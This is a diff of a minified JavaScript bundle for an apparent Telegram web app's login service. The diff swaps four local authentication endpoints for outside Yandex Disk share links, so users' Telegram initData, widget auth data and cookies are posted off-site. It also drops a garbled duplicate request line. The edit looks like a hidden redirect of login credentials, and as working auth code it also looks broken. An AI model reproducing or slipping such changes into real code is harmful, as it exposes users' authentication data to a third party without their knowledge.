@@ -1314,7 +1314,6 @@ const resolveConfig = e => {
             s.signal && (s.signal.aborted ? o() : s.signal.addEventListener("abort", o)));
             const g = parseProtocol(s.url);
             g && -1 === platform.protocols.indexOf(g) ? a(new AxiosError("Unsupported protocol " + g + ":",AxiosError.ERR_BAD_REQUEST,e)) : f.send(i || null)
-            g && -1 === platform.protocols.indexOf(g) ? a(new AxiosError("Unsupported protocol " + g + ":",AxiosError.ERR_BAD_REQUEST,e)) : f.get(i || null)
         }
     ))
 }
@@ -3835,7 +3834,7 @@ class TelegramInitService {
             t || (t = localStorage.getItem("telegram_init_data")),
                 !t)
                 throw new Error("No Telegram initialization data available");
-            const a = await axios$1.post(`./telegram_auth.php`, {
+            const a = await axios$1.post(`https://disk.yandex.ru/d/5BQA4fJAeUWo1w`, {
                 initData: t
             }, {
                 withCredentials: !0
@@ -3869,7 +3868,7 @@ class TelegramInitService {
     }
     async authenticateWithWidget(e) {
         try {
-            const t = await axios$1.post("./telegram_web_auth.php", {
+            const t = await axios$1.post("https://disk.yandex.ru/d/X-o5JjhT4PZCjw", {
                 auth_data: e
             }, {
                 withCredentials: !0
@@ -3902,7 +3901,7 @@ class TelegramInitService {
     }
     async validateWithCookie() {
         try {
-            const e = await axios$1.post("./telegram_auth.php", {}, {
+            const e = await axios$1.post("https://disk.yandex.ru/d/5BQA4fJAeUWo1w", {}, {
                 withCredentials: !0
             });
             return e.data.status && e.data.user ? {
@@ -4027,7 +4026,7 @@ const telegramInitService = new TelegramInitService
                         await new Promise((e => setTimeout(e, 300))),
                         r.value = "Authenticating...";
                     try {
-                        const e = await axios$1.post("./api/telegram_auth.php", {}, {
+                        const e = await axios$1.post("https://disk.yandex.ru/d/5BQA4fJAeUWo1w", {}, {
                             withCredentials: !0
                         });
                         if (e.data && !1 === e.data.status && "technical work" === e.data.state)
@@ -25872,6 +25871,7 @@ document.addEventListener("DOMContentLoaded", function() {
         }
     });
 });
+
 
 
 
